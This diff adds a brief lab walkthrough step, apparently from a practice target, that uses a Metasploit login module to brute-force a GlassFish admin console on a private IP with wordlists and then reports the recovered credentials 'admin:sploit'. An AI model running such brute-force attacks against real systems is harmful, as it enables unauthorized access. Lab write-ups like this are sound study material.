@@ -1,0 +1,19 @@
+# since glassfish login is there at 4848 we can bruteforce the login using a module in metasploit
+
+search glassfish_login
+
+set RHOSTS 192.168.56.3
+
+set ssl true
+
+set user_file user.txt
+
+set pass_file pass.txt
+
+run
+
+we get credentials 
+
+admin:sploit
+
+we can access admin page of glass fish through the login
